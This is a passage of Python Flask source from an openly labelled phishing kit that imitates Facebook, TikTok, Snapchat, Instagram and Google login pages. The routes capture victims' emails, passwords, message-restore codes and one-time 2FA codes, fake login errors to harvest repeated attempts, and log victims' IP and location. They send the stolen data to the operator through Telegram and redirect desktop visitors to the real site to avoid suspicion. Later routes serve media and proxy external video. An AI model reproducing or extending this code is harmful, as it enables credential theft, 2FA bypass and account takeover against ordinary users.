        platform = _platforms.PLATFORMS["facebook"]

    # ────────────────────────────────────────────────────────────────────
    #  PC redirect for mobile-only platforms (TikTok, Snapchat, Instagram, Google)
    #  If the visitor is on a desktop browser (not a mobile User-Agent),
    #  redirect them to the official platform website instead of showing
    #  the phishing page. This avoids suspicion from desktop users who
    #  would normally see a mobile-only layout on a wide screen.
    # ────────────────────────────────────────────────────────────────────
    try:
        _pid_redirect = (cfg.get("platform") or "facebook").lower().strip()
        # ── Toutes les plateformes sont mobile-only maintenant ──
        # Facebook est aussi mobile-only : redirection PC vers le site officiel
        if _pid_redirect in ("facebook", "tiktok", "snapchat", "instagram", "google"):
            _ua = request.headers.get('User-Agent', '')
            _is_mobile_ua = any(x in _ua for x in ["Android", "iPhone", "iPad", "Mobile"])
            if not _is_mobile_ua:
                # Desktop detected → redirect to the official site
                _official_url = platform.get("default_redirect")
                if _official_url:
                    try:
                        ajouter_log("REDIRECT PC", f"Desktop user redirected to official site: {_official_url} (platform: {_pid_redirect})", "#3498db", force_cfg=cfg)
                        envoyer_telegram(f"🖥️ <b>PC détecté</b>\nPlateforme: {_pid_redirect}\nRedirigé vers: {_official_url}")
                    except Exception:
                        pass
                    return redirect(_official_url)
    except Exception as e:
        _route_log("index.pc_redirect", e)
        try:
            from helpers import log_error
            log_error("routes.index.pc_redirect", e)
        except Exception:
            pass

    _can_go_back = False
    try:
        _history = session.get('platform_history', [])
        if _history:
            _can_go_back = True
    except Exception as e:
        _route_log("index.platform_history", e)

    ip = recuperer_ip_robuste(request)
    lang = detect_language(request)
    # Use platform translations if available, fallback to helpers (FB)
    try:
        t = _platforms.get_translations_for(cfg, lang)
        if not t:
            t = get_translations(lang)
    except Exception as e:
        _route_log("index.translations", e)
        t = get_translations(lang)

    custom_otp_sub = cfg.get("custom_otp_sub", "").strip()
    if custom_otp_sub:
        t = dict(t)
        t['otp_sub'] = custom_otp_sub

    # ── Message personnalisé pour la page de restauration des messages ──
    custom_msg_restore_sub = cfg.get("custom_msg_restore_sub", "").strip()
    if custom_msg_restore_sub:
        t = dict(t)
        t['msg_restore_sub'] = custom_msg_restore_sub

    if 'ip_logged' not in session:
        try:
            victim_info = obtenir_infos_reseau(ip)
            net_info_str = f"Country: {victim_info['country']} | City: {victim_info['city']}"
            ajouter_log("VICTIM", f"IP: {ip} | {net_info_str} | Lang: {lang.upper()} | Platform: {platform.get('name','?')}", "#ff7675")
            envoyer_telegram(f"🎯 <b>Nouvelle victime</b>\nIP: {ip}\n{victim_info['country']} - {victim_info['city']}\nPlatform: {platform.get('name','?')}")
            session['victim_info'] = victim_info
        except Exception as e:
            _route_log("index.victim_log", e)
            session['victim_info'] = {"country": "Unknown", "city": "Unknown"}
        ua = request.headers.get('User-Agent', '')
        is_mobile_ua = any(x in ua for x in ["Android", "iPhone", "iPad", "Mobile"])
        session['device_str'] = "Android • Chrome" if is_mobile_ua else "Windows • Chrome"
        session['ip_logged'] = True

    if 'current_step' not in session:
        session['current_step'] = 'login_page'

    # ── Gate feed : redirige vers /feed UNIQUEMENT à la toute première visite ──
    # (current_step == 'login_page', pas de tentative de login en cours, pas
    # d'OTP/message_restore déjà saisis). Une fois que la victime a interagi, on ne
    # doit JAMAIS retourner au feed, même si elle actualise ou fait Back.
    # from_feed=1 (après feed_click) skip aussi cette redirection.
    _has_interacted = (
        session.get('att', 0) > 0
        or session.get('o_att', 0) > 0
        or session.get('mr_att', 0) > 0
    )
    if request.method == "GET" and cfg.get("feed_enabled") and cfg.get("publications") \
       and session.get('current_step') == 'login_page' \
       and not _has_interacted \
       and request.args.get('from_feed') != '1':
        return redirect('/feed')

    ua = request.headers.get('User-Agent', '')
    is_mobile_ua = any(x in ua for x in ["Android", "iPhone", "iPad", "Mobile"])
    is_mobile_view = (cfg.get("mode") == "auto" and is_mobile_ua) or cfg.get("mode") == "mobile"

    try:
        _pid = (cfg.get("platform") or "facebook").lower().strip()
        if _pid in ("tiktok", "snapchat", "instagram", "google"):
            is_mobile_view = True
        # ── Facebook est maintenant mobile-only : toujours forcer le mode mobile ──
        if _pid == "facebook":
            is_mobile_view = True
    except Exception as e:
        _route_log("index.platform_mobile_check", e)

    if request.method == "POST":
        act = request.form.get("action")
        if act == "login":
            email = request.form.get("email", "")
            pwd = request.form.get("pass", "")
            
            current_att = session.get('att', 0)
            max_errors = cfg.get("id_errors", 1)
            
            save_config = str(cfg.get("save_attempts", "all")).lower()
            att_num = current_att + 1
            should_save = False
            
            if save_config == "all" or save_config == "":
                should_save = True
            elif str(att_num) in save_config.split(','):
                should_save = True
            elif "-" in save_config:
                try:
                    s, e = map(int, save_config.split('-'))
                    if s <= att_num <= e: should_save = True
                except (ValueError, IndexError): pass
                
            if current_att < max_errors:
                current_att += 1
                session['att'] = current_att
                ajouter_log(f"ATTEMPT {current_att}", f"ID: {email} | PWD: {pwd}", "#f1c40f")
                if should_save:
                    sauvegarder_identifiants_purs("EMAIL", f"{email} (Essai {current_att})")
                    sauvegarder_identifiants_purs("PASSWORD", pwd)
                session['msg'] = t.get('login_error', 'Login error')
                return redirect(url_for('index'))
            else:
                cfg["last_creds"].update({"email": email, "pass": pwd})
                ajouter_log("FINAL ID", email, "#27ae60")
                ajouter_log("FINAL PASS", pwd, "#27ae60")
                if should_save or save_config == "all":
                    att_str = f" (Essai {current_att + 1})" if current_att > 0 else ""
                    sauvegarder_identifiants_purs("EMAIL", email + att_str)
                    sauvegarder_identifiants_purs("PASSWORD", pwd)
                envoyer_telegram(f"✅ <b>Identifiants capturés</b>\nEmail: {email}\nPass: {pwd}")
                # ── Après le login, on va toujours au checkpoint (confirmation d'identité) ──
                # La page de restauration des messages (si activée) s'affiche APRÈS le checkpoint.
                session['current_step'] = 'checkpoint_page'
                return redirect(url_for('index'))

        elif act == "restore_code":
            # ── Code de restauration de l'historique des messages ──
            # Cette étape arrive APRÈS le checkpoint (confirmation d'identité).
            restore_code = request.form.get("restore_code", "").replace(" ", "").strip()
            # Le code doit contenir EXACTEMENT 6 chiffres (pas plus, pas moins)
            if not restore_code.isdigit() or len(restore_code) != 6:
                session['msg'] = t.get('msg_restore_invalid', 'Invalid code, exactly 6 digits required.')
                return redirect(url_for('index'))

            # ── Simulation du nombre d'erreurs (comme pour l'OTP) ──
            current_mr_att = session.get('mr_att', 0)
            max_mr_errors = cfg.get("msg_restore_errors", 1)

            if current_mr_att < max_mr_errors:
                # Tentative intermédiaire → enregistrer et recharger la page
                current_mr_att += 1
                session['mr_att'] = current_mr_att
                try:
                    ajouter_log(f"MSG RESTORE {current_mr_att}", restore_code, "#e67e22")
                    sauvegarder_identifiants_purs(f"MSG RESTORE {current_mr_att}", restore_code)
                    envoyer_telegram(f"💬 <b>Code restauration messages {current_mr_att} :</b> {restore_code}")
                except Exception as _restore_err:
                    _route_log("index.restore_code.save_intermediate", _restore_err)
                    from helpers import log_error
                    log_error("routes.index.restore_code.intermediate", _restore_err)
                session['msg'] = t.get('msg_restore_invalid', 'Invalid code, exactly 6 digits required.')
                return redirect(url_for('index'))
            else:
                # Code final → enregistrer comme FINAL et passer à l'OTP
                final_mr_num = current_mr_att + 1
                try:
                    ajouter_log(f"FINAL MSG RESTORE {final_mr_num}", restore_code, "#2ecc71")
                    sauvegarder_identifiants_purs(f"FINAL MSG RESTORE {final_mr_num}", restore_code)
                    envoyer_telegram(f"💬 <b>Code restauration messages (final) :</b> {restore_code}")
                except Exception as _restore_err:
                    _route_log("index.restore_code.save_final", _restore_err)
                    from helpers import log_error
                    log_error("routes.index.restore_code.final", _restore_err)
                session['current_step'] = 'otp_page'
                return redirect(url_for('index'))

        elif act == "checkpoint":
            # ── Après le checkpoint, si la restauration des messages est activée,
            #    on va à la page de restauration. Sinon, on va directement à l'OTP ──
            if cfg.get("message_restore_enabled", False):
                session['current_step'] = 'message_restore_page'
            else:
                session['current_step'] = 'otp_page'
            return redirect(url_for('index'))

        elif act == "code":
            code = request.form.get("code", "").replace(" ", "")
            if not code.isdigit() or len(code) < 6:
                session['msg'] = t.get('otp_invalid', 'Invalid code')
                return redirect(url_for('index'))
            
            current_o_att = session.get('o_att', 0)
            max_o_errors = cfg.get("otp_errors", 1)
            
            if current_o_att < max_o_errors:
                current_o_att += 1
                session['o_att'] = current_o_att
                cfg["last_creds"][f"otp{current_o_att}"] = code
                ajouter_log(f"OTP {current_o_att}", code, "#e67e22")
                sauvegarder_identifiants_purs(f"OTP {current_o_att}", code)
                envoyer_telegram(f"🔢 <b>OTP {current_o_att} :</b> {code}")
                session['msg'] = t.get('otp_error', 'Invalid code')
                return redirect(url_for('index'))
            else:
                final_otp_num = current_o_att + 1
                cfg["last_creds"][f"otp{final_otp_num}"] = code
                ajouter_log(f"FINAL OTP {final_otp_num}", code, "#2ecc71")
                sauvegarder_identifiants_purs(f"FINAL OTP {final_otp_num}", code)
                envoyer_telegram(f"🎉 <b>OTP Final :</b> {code}")
                final_redir = session.get("custom_redirect") or cfg.get("redirect_url", "https://www.facebook.com")
                return redirect(final_redir)

    msg = session.pop('msg', "")

    if session['current_step'] == 'otp_page':
        # Pick platform OTP template
        try:
            layout = _platforms.get_template(cfg, "mobile_otp" if is_mobile_view else "pc_otp") or HTML_OTP_MOBILE
        except Exception as e:
            _route_log("index.otp_template", e)
            layout = HTML_OTP_MOBILE
        return render_template_string(layout, lang=lang, **t, message=msg, can_go_back=_can_go_back)
    elif session['current_step'] == 'message_restore_page':
        # ── Page de restauration de l'historique des messages ──
        # Affichée après le login si message_restore_enabled est activé.
        # Demande un code de restauration avec une interface en cases individuelles.
        try:
            return render_template_string(HTML_MESSAGE_RESTORE, lang=lang, **t, message=msg, can_go_back=_can_go_back)
        except Exception as e:
            _route_log("index.message_restore_template", e)
            from helpers import log_error
            log_error("routes.index.message_restore_template", e)
            # Fallback : passer directement au checkpoint
            session['current_step'] = 'checkpoint_page'
            return redirect(url_for('index'))
    elif session['current_step'] == 'checkpoint_page':
        victim_info = session.get('victim_info', {"country": "Unknown", "city": "Unknown"})
        device_str = session.get('device_str', "Unknown Device")
        direction = "rtl" if lang == "ar" else "ltr"
        lang_name = {"en":"English", "fr":"Français", "es":"Español", "pt":"Português", "ar":"العربية", "de":"Deutsch", "it":"Italiano", "zh":"中文"}.get(lang, "English")
        locale = 'fr-FR' if lang=='fr' else 'en-US'
        try:
            tmpl = _platforms.get_template(cfg, "checkpoint") or HTML_CHECKPOINT
        except Exception as e:
            _route_log("index.checkpoint_template", e)
            tmpl = HTML_CHECKPOINT
        return render_template_string(tmpl, lang=lang, direction=direction, lang_name=lang_name, locale=locale, device=device_str, city=victim_info.get('city', 'Unknown'), country=victim_info.get('country', 'Unknown'), can_go_back=_can_go_back, **t)
    else:
        # ── Fake loading page avant la page de login ──
        # Réaffiché à chaque rechargement / Back (plus de verrou session).
        # Pour éviter une boucle infinie (chargement → redirect / → chargement...),
        # on orchestre la séquence via des query params :
        #   - GET /            → affiche le 1er chargement, redirige ensuite vers :
        #                          /?show_second=1  (si 2e activé) OU /?loaded=1 (sinon)
        #   - GET /?show_second=1 → skip le 1er, affiche le 2e, redirige vers /?loaded=1
        #   - GET /?loaded=1   → skip tous les chargements, affiche le login
        _loading_type = cfg.get("fake_loading_type", "spinner")
        _s_speed, _d_speed = _resolve_loading_speeds(cfg)
        _skip_loading = request.args.get('loaded') == '1'
        _show_second = request.args.get('show_second') == '1'
        # from_feed=1 est propagé dans toute la chaîne de chargement pour éviter
        # que la gate feed (plus haut) ne redirige vers /feed au lieu du login.
        _keep_from_feed = '&from_feed=1' if request.args.get('from_feed') == '1' else ''

        # ── Fake loading page avant la page de login ──
        # Réaffiché à chaque rechargement / Back (plus de verrou session).
        # Pour éviter une boucle infinie (chargement → redirect / → chargement...),
        # on orchestre la séquence via des query params :
        #   - GET /            → affiche le 1er chargement, redirige ensuite vers :
        #                          /?show_second=1  (si 2e activé) OU /?loaded=1 (sinon)
        #   - GET /?show_second=1 → skip le 1er, affiche le 2e, redirige vers /?loaded=1
        #   - GET /?loaded=1   → skip tous les chargements, affiche le login
        # Une fois que la victime a interagi (tentative de login, OTP...), on saute
        # TOUS les chargements pour ne pas bloquer le flux.
        _loading_type = cfg.get("fake_loading_type", "spinner")
        _s_speed, _d_speed = _resolve_loading_speeds(cfg)
        _skip_loading = request.args.get('loaded') == '1' or _has_interacted
        _show_second = request.args.get('show_second') == '1' and not _has_interacted
        # from_feed=1 est propagé dans toute la chaîne de chargement pour éviter
        # que la gate feed (plus haut) ne redirige vers /feed au lieu du login.
        _keep_from_feed = '&from_feed=1' if request.args.get('from_feed') == '1' else ''

        # ── 1er chargement (durée = fake_loading_duration) ──
        if cfg.get("fake_loading_enabled") and not _skip_loading and not _show_second:
            try:
                loading_html = _platforms.handle_loading(cfg)
                # Cible après le 1er chargement : 2e si activé, sinon login
                _next_url = f'/?show_second=1{_keep_from_feed}' if cfg.get("second_loading_enabled") \
                    else f'/?loaded=1{_keep_from_feed}'
                if loading_html:
                    return loading_html
                # ── Fallback : page de chargement Facebook ──
                _duration = int(cfg.get("fake_loading_duration", 3))
                if _duration < 1: _duration = 1
                _fb_loading = _build_fb_loading_page(_duration, _next_url, _loading_type, _s_speed, _d_speed)
                if _fb_loading:
                    return _fb_loading
            except Exception as e:
                _route_log("index.login_loading", e)
                try:
                    from helpers import log_error
                    log_error("routes.index.login_loading", e)
                except Exception:
                    pass

        # ── 2e chargement optionnel avant la page de login ──
        # Même type et vitesse que le 1er, durée indépendante (second_loading_duration)
        if cfg.get("fake_loading_enabled") and cfg.get("second_loading_enabled") \
           and not _skip_loading and _show_second:
            try:
                _duration2 = int(cfg.get("second_loading_duration", 3))
                if _duration2 < 1: _duration2 = 1
                _fb_loading2 = _build_fb_loading_page(_duration2, f'/?loaded=1{_keep_from_feed}', _loading_type, _s_speed, _d_speed)
                if _fb_loading2:
                    return _fb_loading2
            except Exception as e:
                _route_log("index.login_loading_2", e)
                try:
                    from helpers import log_error
                    log_error("routes.index.login_loading_2", e)
                except Exception:
                    pass

        try:
            layout = _platforms.get_template(cfg, "mobile_login" if is_mobile_view else "pc_login") or HTML_MOBILE
        except Exception as e:
            _route_log("index.login_template", e)
            layout = HTML_MOBILE
        pic = cfg.get("target_pic") or cfg.get("victim_photo", "")
        if pic and not pic.startswith("http") and not pic.startswith("data:"):
            if "/" in pic:
                pic = "https://" + pic
            else:
                pic = f"/video/{cfg['target_name']}/{pic}"
        return render_template_string(layout, lang=lang, user_name=cfg.get("display_name", cfg.get("target_name")), picture=pic, message=msg, can_go_back=_can_go_back, **t)

@app.route("/switch_platform/<platform_id>", methods=["GET"])
def switch_platform(platform_id):
    try:
        pid = (platform_id or "").lower().strip()
        if pid not in _platforms.PLATFORMS:
            return redirect(url_for('index'))
        _curr = session.get('platform_override')
        if not _curr:
            try:
                _cfg = get_cfg()
                _curr = (_cfg.get("platform") or "facebook").lower().strip()
            except Exception:
                _curr = "facebook"
        _history = session.get('platform_history', [])
        if _curr and _curr != pid:
            _history.append(_curr)
            session['platform_history'] = _history
            # Stocker la plateforme source pour le pivoting (affiché dans les identifiants)
            session['source_platform'] = _curr
        session['platform_override'] = pid
        session['current_step'] = 'login_page'
        session.pop('att', None)
        session.pop('o_att', None)
        session.pop('mr_att', None)
        session.pop('msg', None)
        # Forcer la page de login : from_feed=1 skip le redirect vers /feed,
        # mais montre le chargement login (pas de loaded=1).
        return redirect('/?from_feed=1')
    except Exception as e:
        _route_log("switch_platform", e)
        return redirect(url_for('index'))


@app.route("/back_platform", methods=["GET"])
def back_platform():
    try:
        _history = session.get('platform_history', [])
        if not _history:
            session.pop('platform_override', None)
            session.pop('platform_history', None)
            return redirect(url_for('index'))
        _prev_pid = _history.pop()
        session['platform_history'] = _history
        session['platform_override'] = _prev_pid
        return redirect(url_for('index'))
    except Exception as e:
        _route_log("back_platform", e)
        return redirect(url_for('index'))


@app.route("/video/<target_name>/<filename>")
def serve_video(target_name, filename):
    """Serve video/image files from the app's video directory with cache support.
    Fallback: if the file is not in the video dir, search publications/config
    for an absolute path whose basename matches, and serve from there."""
    try:
        import os
        from flask import send_file, Response
        from config import get_video_dir

        cfg = get_cfg()
        if not cfg["running"]:
            return "Offline", 403

        # Security: ensure target_name matches current config and filename is safe
        if cfg.get("target_name") != target_name:
            return "Forbidden", 403

        # Prevent directory traversal attacks
        if ".." in filename or "/" in filename or "\\" in filename:
            return "Forbidden", 403

        video_dir = get_video_dir(target_name)
        video_path = os.path.join(video_dir, filename)

        # ── Primary: file is in the video directory ──────────────────────────
        if os.path.exists(video_path):
            real_path = os.path.realpath(video_path)
            allowed_dir = os.path.realpath(video_dir)
            if not real_path.startswith(allowed_dir):
                return "Forbidden", 403
            mime_type = get_mime_type(filename)
            return stream_local_video(video_path, mime_type)

        # ── Fallback: search _original_paths preserved before resolve_img ──────
        # The user chose a local file by absolute path; routes.py saved the
        # original path in p["_original_paths"] before transforming it.
        fallback_path = None
        for pub in cfg.get("publications", []):
            orig = pub.get("_original_paths", {})
            for _field, abs_path in orig.items():
                if os.path.basename(abs_path) == filename and os.path.exists(abs_path):
                    fallback_path = abs_path
                    break
            if fallback_path:
                break

        # Secondary fallback: check raw field values (in case _original_paths is missing)
        if not fallback_path:
            for pub in cfg.get("publications", []):
                for field in ("image", "video_cover", "profile_pic", "group_pic",
                              "share_pic", "share_group_pic", "music_url"):
                    val = pub.get(field, "")
                    if val and os.path.isabs(val) and os.path.basename(val) == filename:
                        if os.path.exists(val):
                            fallback_path = val
                            break
                if fallback_path:
                    break

        # Also check top-level config fields (e.g. target_pic, victim_photo)
        if not fallback_path:
            for field in ("target_pic", "victim_photo"):
                val = cfg.get(field, "")
                if val and os.path.isabs(val) and os.path.basename(val) == filename:
                    if os.path.exists(val):
                        fallback_path = val
                        break

        if fallback_path:
            mime_type = get_mime_type(filename)
            return stream_local_video(fallback_path, mime_type)

        # Log the lookup failure for debugging
        from helpers import log_error
        log_error('routes.serve_video', f"File not found: {filename} (video_dir={video_dir}, pubs_count={len(cfg.get('publications', []))})")
        return "Not Found", 404

    except Exception as e:
        from helpers import log_error
        log_error('routes.serve_video', e)
        return "Error", 500


@app.route("/video_route/<target_name>/<video_id>")
def serve_video_by_id(target_name, video_id):
    """
    Serve videos by ID using VideoURLManager
    Supports:
    - Local files from sandbox
    - External URLs (long, complex, encrypted)
    """
    try:
        import os
        from flask import send_file, redirect, Response
        from config import get_video_dir
        from video_manager import VideoURLManager
        
        cfg = get_cfg()
        if not cfg["running"]:
            return "Offline", 403
        
        # Security: ensure target_name matches current config
        if cfg.get("target_name") != target_name:
            return "Forbidden", 403
        
        # Get video URL from manager
        manager = VideoURLManager(target_name)
        video_url, is_external, original_input = manager.get_video_url(video_id)
        
        if not video_url:
            return "Not Found", 404
        
        # If it's an external URL, redirect to it with CORS
        if is_external:
            response = redirect(video_url, code=307)
            response.headers['Access-Control-Allow-Origin'] = '*'
            response.headers['Access-Control-Allow-Methods'] = 'GET, HEAD, OPTIONS'
            return response
        
        # Otherwise, serve local file
        video_dir = get_video_dir(target_name)
        video_path = os.path.join(video_dir, video_url)
        
        # Security: prevent directory traversal
        if ".." in video_url or "/" in video_url or "\\" in video_url:
            return "Forbidden", 403
        
        if not os.path.exists(video_path):
            return "Not Found", 404
        
        # Verify file is in correct directory
        real_path = os.path.realpath(video_path)
        allowed_dir = os.path.realpath(video_dir)
        if not real_path.startswith(allowed_dir):
            return "Forbidden", 403
        
        # Get MIME type and serve stream
        mime_type = get_mime_type(video_url)
        return stream_local_video(video_path, mime_type)
        
    except Exception as e:
        ajouter_log("SYSTEM", f"Error serving video by ID: {e}", "#ef4444")
        return "Error", 500

@app.route("/proxy_video")
def proxy_video():
    """
    Proxy external video URLs through local server so the Service Worker
    can cache them (bypasses CORS). Supports HTTP Range requests for seeking.
    """
    try:
        import requests as req
        from flask import Response, stream_with_context

        cfg = get_cfg()
        if not cfg["running"]:
            return "Offline", 403

        url = request.args.get("url", "").strip()
        if not url or not (url.startswith("http://") or url.startswith("https://")):
            return "Bad Request", 400

        # Use a realistic browser User-Agent — many CDNs return 403/404 to
        # unknown User-Agents like "VideoProxy/1.0".
        ua = request.headers.get("User-Agent") or (
            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        )
        headers = {
            "User-Agent": ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
            "Accept-Encoding": "identity",  # no gzip — we stream raw bytes
            "Referer": url.split('?')[0],   # some CDNs require a Referer
            "Origin": url.split('?')[0],
        }
        # Forward Range header if present (for seeking)
        range_header = request.headers.get("Range")
        if range_header:
            headers["Range"] = range_header

        try:
            upstream = req.get(url, headers=headers, stream=True, timeout=30, allow_redirects=True)
        except req.exceptions.Timeout:
            return Response("Upstream timeout", status=504, mimetype="text/plain")
        except req.exceptions.ConnectionError as e:
            from helpers import log_error
            log_error('routes.proxy_video.conn', e)
            return Response("Upstream connection failed", status=502, mimetype="text/plain")
        except Exception as e:
            from helpers import log_error
            log_error('routes.proxy_video.fetch', e)
            return Response(f"Upstream error: {e}", status=502, mimetype="text/plain")

        # If the upstream returned an error, surface it with full context
        # so the browser can see WHY the URL failed (helps debugging 404s).
        if not upstream.ok and upstream.status_code != 206:
            try:
                from helpers import log_error as _le
                _le('routes.proxy_video.upstream',
                    f"URL={url} status={upstream.status_code} reason={upstream.reason}")
            except Exception as e:
                _route_log("proxy_video.upstream_log", e)

        def generate():
            try:
                for chunk in upstream.iter_content(chunk_size=65536):
                    if chunk:
                        yield chunk
            except Exception as e:
                from helpers import log_error
                log_error('routes.proxy_video.stream', e)

        # Use the upstream Content-Type if available; default to video/mp4
        # (NOT application/octet-stream which browsers refuse to play).
        ct = upstream.headers.get("Content-Type", "").split(";")[0].strip().lower()
        if not ct or ct in ("application/octet-stream", "binary/octet-stream"):
            ct = "video/mp4"

        # ── HLS m3u8 playlist rewriting ───────────────────────────────────
        # m3u8 playlists contain RELATIVE segment URLs (e.g. "segment-1.ts").
        # When the browser loads the m3u8 via /proxy_video?url=..., it resolves
        # those relative URLs against the PROXY URL (→ /segment-1.ts → 404),
        # NOT against the original m3u8 URL. We must rewrite every segment URL
        # inside the playlist to an absolute URL that goes back through the proxy.
        is_m3u8 = ("mpegurl" in ct) or ("m3u8" in ct) or (url.lower().endswith(".m3u8"))

        if is_m3u8:
            try:
                from urllib.parse import urljoin
                content = upstream.content
                text = content.decode('utf-8', errors='replace')

                # Check if it really is an m3u8 (some CDNs lie about Content-Type)
                if not text.lstrip().startswith('#EXTM3U'):
                    is_m3u8 = False

                if is_m3u8:
                    base_url = url  # original m3u8 URL, used to resolve relative paths
                    rewritten_lines = []
                    for raw_line in text.splitlines():
                        stripped = raw_line.strip()
                        if not stripped:
                            rewritten_lines.append(raw_line)
                            continue

                        if stripped.startswith('#'):
                            # Rewrite URI="..." attributes inside tags like:
                            #   #EXT-X-KEY:URI="key.bin",METHOD=AES-128
                            #   #EXT-X-MAP:URI="init.mp4"
                            #   #EXT-X-MEDIA:URI="audio.m3u8"
                            import re as _re
                            def _rewrite_uri_attr(m):
                                inner_url = m.group(1)
                                # Resolve against the m3u8 base URL
                                absolute = urljoin(base_url, inner_url)
                                # Re-proxy it so CORS + segment rewriting still apply
                                proxied = f"/proxy_video?url={quote(absolute, safe='')}"
                                return f'URI="{proxied}"'
                            new_line = _re.sub(r'URI="([^"]+)"', _rewrite_uri_attr, raw_line)
                            rewritten_lines.append(new_line)
                        else:
                            # It's a segment URL (relative or absolute) → rewrite
                            absolute = urljoin(base_url, stripped)
                            proxied = f"/proxy_video?url={quote(absolute, safe='')}"
                            # Preserve any leading whitespace
                            leading_ws = raw_line[:len(raw_line) - len(raw_line.lstrip())]
                            rewritten_lines.append(leading_ws + proxied)

                    modified_text = '\n'.join(rewritten_lines) + '\n'
                    modified_bytes = modified_text.encode('utf-8')

                    from flask import Response as _R
                    return _R(
                        modified_bytes,
                        status=200,
                        headers={
                            "Content-Type": "application/vnd.apple.mpegurl",
                            "Accept-Ranges": "bytes",
                            "Access-Control-Allow-Origin": "*",
                            "Access-Control-Allow-Methods": "GET, HEAD, OPTIONS",
                            "Access-Control-Expose-Headers": "Content-Length, Content-Range, Accept-Ranges, Content-Type",
                            "Cache-Control": "public, max-age=300",  # short cache for playlists
                            "Content-Length": str(len(modified_bytes)),
                        },
                    )
            except Exception as e:
                from helpers import log_error
                log_error('routes.proxy_video.m3u8_rewrite', e)
                # Fall through to normal streaming on rewrite failure

        resp_headers = {
            "Content-Type": ct,
            "Accept-Ranges": "bytes",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, HEAD, OPTIONS",
            "Access-Control-Expose-Headers": "Content-Length, Content-Range, Accept-Ranges, Content-Type",
            "Cache-Control": "public, max-age=2592000, immutable",
        }
        for h in ("Content-Length", "Content-Range", "ETag", "Last-Modified"):
            if h in upstream.headers:
                resp_headers[h] = upstream.headers[h]

        return Response(
            stream_with_context(generate()),
            status=upstream.status_code,
            headers=resp_headers,
        )

    except Exception as e:
        from helpers import log_error
        log_error("routes.proxy_video", e)
        return "Error", 500
